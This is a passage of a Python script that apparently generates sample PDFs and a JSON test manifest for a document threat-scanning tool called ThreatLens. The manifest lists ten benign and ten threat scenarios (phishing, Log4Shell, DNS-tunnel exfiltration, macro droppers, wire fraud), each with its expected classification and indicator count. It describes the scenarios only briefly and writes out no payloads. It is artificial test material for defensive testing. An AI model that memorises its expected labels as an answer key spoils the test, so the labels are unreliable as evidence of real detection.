            ["GET", "/health", "Service readiness probe & database connectivity check", "Public / Internal Network"],
            ["GET", "/metrics", "Prometheus telemetry format performance metrics", "Internal Network Only"]
        ], colWidths=[80, 110, 210, 110], style=TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#1E3A8A")),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E1")),
            ('FONTSIZE', (0,0), (-1,-1), 8),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ]), spaceAfter=14),

        Paragraph("3. Security & Telemetry Standards", s["h2"]),
        Paragraph("• All service-to-service communication mandates mutual TLS 1.3 encryption.", s["body"]),
        Paragraph("• Rate limiting enforces a maximum of 1,000 requests per minute per authenticated client API token.", s["body"]),
        Paragraph("• Continuous compliance scanning verifies absence of OWASP API Top 10 vulnerabilities.", s["body"]),
        Spacer(1, 10),
        Paragraph("Triage Assessment: SAFE / BENIGN TECHNICAL SPECIFICATION (No Indicators Detected)", s["callout"])
    ]
    build_pdf(filepath, story)

def update_manifest():
    manifest_path = SAMPLE_DIR / "test_manifest.json"
    manifest = {
        "generated_at": "2026-10-16T16:45:00Z",
        "description": "ThreatLens Comprehensive PDF Verification & Testing Suite (20 Scenario PDFs)",
        "documents": [
            # 10 Safe PDFs
            {
                "filename": "safe_company_policy.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Benign",
                "pages": 3,
                "file_type": "PDF",
                "description": "Corporate information security policy outlining employee responsibilities, password management, and incident response.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_project_report.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Benign",
                "pages": 3,
                "file_type": "PDF",
                "description": "Software engineering architecture report detailing microservices, database schemas, and performance benchmarks.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_security_awareness.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Educational",
                "pages": 3,
                "file_type": "PDF",
                "description": "Educational training material explaining phishing indicators and safe browsing without being classified as malicious.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_financial_report.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Benign",
                "pages": 3,
                "file_type": "PDF",
                "description": "Audited corporate financial statement with revenue metrics, operational expenditures, and auditor notes.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_incident_response_playbook.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Operational Runbook",
                "pages": 3,
                "file_type": "PDF",
                "description": "NIST SP 800-61 Rev 2 standard operational procedure detailing incident handling, severity SLAs, and forensic chain of custody.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_cloud_infrastructure_guide.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Architecture Spec",
                "pages": 3,
                "file_type": "PDF",
                "description": "Cloud hosting architectural blueprint detailing multi-region Kubernetes deployments, Terraform IaC, and Zero Trust design.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_devops_release_changelog.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Release Manifest",
                "pages": 2,
                "file_type": "PDF",
                "description": "Production release manifest v3.2.1-stable with unit test pass rates, dependency upgrades, and telemetry endpoints.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_quarterly_budget_report.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Financial Ledger",
                "pages": 2,
                "file_type": "PDF",
                "description": "Corporate IT infrastructure ledger tracking approved SaaS subscriptions, vendor allocations, and compute budget variance.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_remote_work_security_handbook.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Policy Guide",
                "pages": 2,
                "file_type": "PDF",
                "description": "Employee remote work guide detailing corporate VPN connections, hardware security keys, and patch policies.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },
            {
                "filename": "safe_api_architecture_spec.pdf",
                "category": "Safe Documents",
                "intended_classification": "Safe / Technical Spec",
                "pages": 2,
                "file_type": "PDF",
                "description": "OpenAPI 3.0 specification for internal inventory REST microservices with contract schemas and health checks.",
                "expected_severity": "No significant indicators detected",
                "expected_indicators": 0
            },

            # 10 Threat PDFs
            {
                "filename": "threat_phishing_email.pdf",
                "category": "Threat Documents",
                "intended_classification": "Phishing",
                "pages": 3,
                "file_type": "PDF",
                "description": "Deceptive executive email lure directing victims to a credential harvesting landing page.",
                "expected_severity": "High",
                "expected_indicators": 4
            },
            {
                "filename": "threat_credential_theft.pdf",
                "category": "Threat Documents",
                "intended_classification": "Credential Theft",
                "pages": 3,
                "file_type": "PDF",
                "description": "Sophisticated phishing document designed to harvest Active Directory credentials and MFA tokens.",
                "expected_severity": "High",
                "expected_indicators": 4
            },
            {
                "filename": "threat_suspicious_download.pdf",
                "category": "Threat Documents",
                "intended_classification": "Malware",
                "pages": 3,
                "file_type": "PDF",
                "description": "Threat report documenting a deceptive zero-day patch advisory delivering a trojan executable.",
                "expected_severity": "High",
                "expected_indicators": 3
            },
            {
                "filename": "threat_social_engineering.pdf",
                "category": "Threat Documents",
                "intended_classification": "Social Engineering / BEC",
                "pages": 3,
                "file_type": "PDF",
                "description": "Business Email Compromise (BEC) scenario coercing finance staff into an unauthorized wire transfer.",
                "expected_severity": "High",
                "expected_indicators": 3
            },
            {
                "filename": "threat_ransomware_incident.pdf",
                "category": "Threat Documents",
                "intended_classification": "Ransomware",
                "pages": 3,
                "file_type": "PDF",
                "description": "Comprehensive intrusion advisory detailing LockBit 3.0 encryption, vssadmin deletion, and ransom demands.",
                "expected_severity": "Critical",
                "expected_indicators": 5
            },
            {
                "filename": "threat_apt_spearphishing.pdf",
                "category": "Threat Documents",
                "intended_classification": "APT / Espionage",
                "pages": 3,
                "file_type": "PDF",
                "description": "Targeted APT29 spearphishing campaign utilizing ISO droppers, memory-injected Mimikatz, and C2 servers.",
                "expected_severity": "High",
                "expected_indicators": 6
            },
            {
                "filename": "threat_log4shell_cve_alert.pdf",
                "category": "Threat Documents",
                "intended_classification": "Vulnerability Exploitation",
                "pages": 3,
                "file_type": "PDF",
                "description": "Structured advisory detailing CVE-2021-44228 Log4Shell JNDI injection exploits, malicious LDAP servers, and shell droppers.",
                "expected_severity": "Critical",
                "expected_indicators": 5
            },
            {
                "filename": "threat_exfiltration_covert_c2.pdf",
                "category": "Threat Documents",
                "intended_classification": "Data Exfiltration",
                "pages": 3,
                "file_type": "PDF",
                "description": "Digital forensics incident report detailing unauthorized 14.8 GB data exfiltration via DNS tunneling to 192.0.2.144 and Cobalt Strike hashes.",
                "expected_severity": "High",
                "expected_indicators": 5
            },
            {
                "filename": "threat_malicious_macro_invoice.pdf",
                "category": "Threat Documents",
                "intended_classification": "Malware / Dropper",
                "pages": 3,
                "file_type": "PDF",
                "description": "EDR process execution log capturing malicious Office macro spawning encoded PowerShell, payload download from bad domain, and C2 IP.",
                "expected_severity": "High",
                "expected_indicators": 5
            },
            {
                "filename": "threat_executive_wire_fraud.pdf",
                "category": "Threat Documents",
                "intended_classification": "Social Engineering / BEC",
                "pages": 3,
                "file_type": "PDF",
                "description": "CEO impersonation Business Email Compromise (BEC) pressuring treasury director to bypass dual-approval and wire $485,000 urgently.",
                "expected_severity": "High",
                "expected_indicators": 3
            }
        ]
    }

    with open(manifest_path, "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2)
    print(f"[+] Updated {manifest_path.name} with all 20 PDF documents.")

def main():
    print("[*] Generating 8 converted sample PDFs...")
    generate_threat_log4shell_pdf(SAMPLE_DIR / "threat_log4shell_cve_alert.pdf")
    generate_threat_exfiltration_pdf(SAMPLE_DIR / "threat_exfiltration_covert_c2.pdf")
    generate_threat_macro_invoice_pdf(SAMPLE_DIR / "threat_malicious_macro_invoice.pdf")
    generate_threat_executive_wire_fraud_pdf(SAMPLE_DIR / "threat_executive_wire_fraud.pdf")
    
    generate_safe_devops_release_pdf(SAMPLE_DIR / "safe_devops_release_changelog.pdf")
    generate_safe_quarterly_budget_pdf(SAMPLE_DIR / "safe_quarterly_budget_report.pdf")
    generate_safe_remote_work_pdf(SAMPLE_DIR / "safe_remote_work_security_handbook.pdf")
    generate_safe_api_architecture_pdf(SAMPLE_DIR / "safe_api_architecture_spec.pdf")

    update_manifest()
    print("[+] All 20 sample test documents are now available as PDFs in sample_documents/")

if __name__ == "__main__":
    main()
